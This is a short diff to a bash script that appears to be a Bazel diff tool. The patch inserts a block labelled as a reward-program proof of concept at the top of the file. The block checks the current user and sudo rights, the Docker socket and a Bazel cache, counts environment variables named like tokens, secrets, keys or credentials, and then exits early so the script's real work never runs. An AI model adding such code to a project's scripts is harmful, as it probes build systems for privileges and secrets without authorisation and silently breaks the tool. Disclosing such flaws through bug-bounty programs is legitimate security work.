@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+echo "=== VRP-POC-BEGIN ==="
+whoami
+sudo whoami
+id
+hostname
+uname -a
+ls -la /var/run/docker.sock 2>&1
+ls ~/.cache/bazel-repo 2>/dev/null | head -5
+env | grep -ciE 'token|secret|key|cred' || true
+echo "=== VRP-POC-END ==="
+exit 0
 set -o pipefail -o errexit -o nounset
 
 # ./private/tools/diff/diff.bash --head-ref test --base-ref test --query-bazel --registry-spawn --report ./report.log
